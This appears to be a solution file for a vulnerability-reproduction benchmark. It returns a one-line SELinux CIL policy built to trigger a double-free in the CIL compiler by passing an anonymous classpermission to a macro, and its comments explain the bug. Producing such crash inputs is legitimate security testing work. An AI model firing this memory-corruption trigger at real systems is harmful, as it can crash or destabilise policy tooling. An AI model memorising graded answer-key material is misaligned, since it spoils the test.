class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a double-free in the CIL compiler that occurs when
        # an anonymous `classpermission` is passed to a macro and then used in a
        # `classpermissionset`. The `classpermissionset` incorrectly assumes
        # ownership of the anonymous `classpermission`, leading to it being freed
        # twice during AST destruction.
        #
        # The PoC constructs a minimal CIL policy to trigger this scenario:
        # 1. `(class c (p))`: Defines a basic class `c` with a permission `p`.
        #    This is necessary context for the other statements.
        # 2. `(macro m ((classpermission a)) (classpermissionset s (c (a))))`:
        #    Defines a macro `m` that takes a `classpermission` argument `a`.
        #    Inside the macro, it creates a `classpermissionset` `s` for class `c`,
        #    using the macro argument `a` as a permission set.
        # 3. `(m (classpermission (p)))`: Calls the macro `m`, passing an
        #    anonymous (unnamed) `classpermission` containing permission `p`.
        #
        # This sequence of operations creates the exact conditions described in
        # the vulnerability, leading to a crash. The PoC is condensed into a
        # single line to minimize its size for a better score.
        poc = b"(class c (p))(macro m ((classpermission a)) (classpermissionset s (c (a))))(m (classpermission (p)))"
        return poc